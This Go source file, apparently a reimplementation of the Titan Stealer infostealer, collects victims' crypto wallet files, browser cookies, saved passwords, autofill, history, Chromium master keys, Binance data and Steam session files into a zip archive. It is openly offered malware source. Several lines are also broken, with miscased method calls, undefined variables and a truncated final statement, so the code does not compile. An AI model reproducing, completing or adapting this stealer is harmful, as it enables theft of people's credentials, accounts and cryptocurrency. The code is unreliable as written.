package titan_stealer

import (
	"archive/zip"
	"bytes"
	"os"
	"strconv"
	// "github.com/brk-a/offensive_go/titan_stealer/titan_stealer/"
)

func TitanStealer() {
	buf := new(bytes.Buffer)
	writer := zip.NewWriter(buf)
	i := 0
	s := 0

	if DESKTOP_WALLETS != "off" {
		for _, w := range CRYPTO_SLICE {
			wname := CRYPTO_NAMES[i]
			i++
			if wf, err := os.ReadDir(w); err == nil {
				for _, fw := range wf {
					if fww, err := os.ReadFile(w + "/" + fw.Name()); err == nil {
						if wff, err := writer.Create("Wallets/" + wname + "/" + fw.Name()); err == nil {
							wff.Write(fww)
						}
					}
				}
			}
		}
	}

	if installed_soft := InstalledSoftware(); len(installed_soft) > 0 {
		if ifw, err := writer.Create("InstalledSoftware.txt"); err == nil {
			for _, s := range installed_soft {
				ifw.Write([]byte(s))
			}
		}
	}

	if infow, err := writer.Create("Info.txt"); err == nil {
		infow.Write([]byte(ID + "\n" + TAG + "\n" + DOMAINDETECTS))
	}

	i = 0
	for _, ff := range GECKO_BROWSERS {
		browser_name := GECKO_NAMES[i]
		i++
		if _, err := os.ReadDir(ff); err == nil {

			cookies, autofills, histories := GeckBrowser(ff)
			if len(cookies) > 0 {
				s = 0
				for _, c := range cookies {
					if cf, err := os.ReadFile(c); err == nil {
						if cw, err := writer.Create("Gecko/" + browser_name + "/Cookies" + strconv.Itoa(s)); err == nil {
							s++
							cw.Write(cf)
						}
					}
				}
			}

			if len(autofills) > 0 {
				s = 0
				for _, a := range autofills {
					if af, err := os.ReadFile(a); err == nil {
						if aw, err := writer.Create("Gecko/" + browser_name + "/Autofill" + strconv.Itoa(s)); err == nil {
							s++
							aw.Write(af)
						}
					}
				}
			}

			if len(histories) > 0 {
				for _, h := range histories {
					if hf, err := os.ReadFile(h); err == nil {
						if hw, err := writer.Create("Gecko/" + browser_name + "/History" + strconv.Itoa(s)); err == nil {
							s++
							hw.Write(hf)
						}
					}
				}
			}
		}
	}

	for _, browser := range CHROMIUM_BROWSERS {
		browser_name := CHROMIUM_NAMES[i]
		i++
		if _, err := os.ReadDir(browser); err == nil {
			wallets, plugins, cookies, passwords, histories, autofills, locals := ChromiumBrowser(browser)
			if len(wallets) > 0 {
				for _, w := range wallets {
					s++
					if dw, err := os.ReadDir(w.WalletPath); err == nil {
						for _, fw := range dw {
							if flw, err := os.ReadFile(w.WalletPath + "/" + fw.Name()); err == nil {
								if wfw, err := writer.Create("Wallets/" + browser_name + w.WalletPath + strconv.Itoa(s)); err == nil {
									wfw.Write(flw)
								}
							}
						}
					}
				}
			}
		}

		if PLUGINS_CONF != "off" {
			size := []byte{}
			if len(plugins) > 0 {
				for _, p := range plugins {
					if pld, err := os.ReadDir(p.PluginPath); err == nil {
						for _, plf := range pld {
							if plr, err := os.ReadFile(p.PluginPath + "/" + plf.Name()); err == nil {
								size = append(size, plr...)
								if len(size) > 5242880 {
									break
								}
								if plw, err := writer.Create("Plugins/" + p.PluginName + "/" + plf.Name()); err == nil {
									plw.Write(plr)
								}
							}
						}
					}
				}
			}
		}
		if len(locals) > 0 {
			if len(cookies) > 0 {
				s = 0
				for _, d := range cookies {
					if cf, err := os.ReadFile(d); err == nil {
						if cw, err := writer.create("Chromium/" + browser_name + "/Cookies" + strconv.Itoa(s)); err==nil{
							s++
							cw.Write(cf)
						}
					}
				}
			}
			if len(passwords) > 0 {
				s = 0
				for _, d := range passwords {
					if cf, err := os.ReadFile(d); err == nil {
						if cw, err := writer.create("Chromium/" + browser_name + "/Passwords" + strconv.Itoa(s)); err==nil{
							s++
							cw.Write(cf)
						}
					}
				}
			}

			s = 0
			for _, lc := range locals {
				if lcc, err := GetMasterKey(lc); err == 0 {
					if w, err := writer.create("Chromium/" + browser_name + "/LocalState" + strconv.Itoa(s)); err==nil{
						s++
						w.Write(lcc)
					}
				}
			}
		}

		if len(histories)>0 {
			s=0
			for _, h := range histories{
				if hr, err := os.ReadFile(h); err==nil{
					if w, err := writer.create("Chromium/" + browser_name + "/History" + strconv.Itoa(s)); err==nil{
						s++
						hw.Write(hr)
					}
				}
			}
		}

		if len(autofills)>0 {
			s=0
			for _, af := range autofills{
				if fa, err := os.ReadFile(af); err==nil{
					if aw, err := writer.create("Chromium/" + browser_name + "/Autofill" + strconv.Itoa(s)); err==nil{
						s++
						aw.Write(fa)
					}
				}
			}
		}
	}

	if BINANCE_CONF != "off"{
		if binance, err := os.ReadFile(APPDATA + "/Binance/app-store.json"); err == nil {
			if bw, err := writer.Create("Wallets/app-store.json"); err == nil {
				bw.Write(binance)
			}
		}
	}

	if STEAM_CONF != "off" {
		ssfn, config := GrabSteam("C:/Program Files (x86)/Steam", "C:/Program Files (x86)/Steam/config")
		if len(ssfn)>0{
			for _, s := range ssfn{
				if wfw, err := os.ReadFile(s.Panther); err == nil {
					if wsw, err := writer.Create(s.Filename); err == nil {
						wsw.Write(wfw)
					}
				}
			}
		}

		if len(config)>0{
			for _, c := range config {
				if fwf, err := os.ReadFile(c.Panther); err == nil {
					if fwc, err := writer.Create(c.Filename); err == nil {
						fwc.Write(fwf)
					}
				}
			}
		}
	}

	if WALLETS_CORE != "off" {
		wallets := []WalletCore{}
		if alldirs, err := os.ReadDir(APPDATA); err == nil {
			s = 0
			for _, dirs := range alldirs {
				if dir, err := os.ReadDir(APPDATA + "/" + dirs.name()); err == nil {
					for _, d := range dir {
						if strings
					}
				}
			}
		}
	}
}

func InstalledSoftware() []string {
	return nil
}
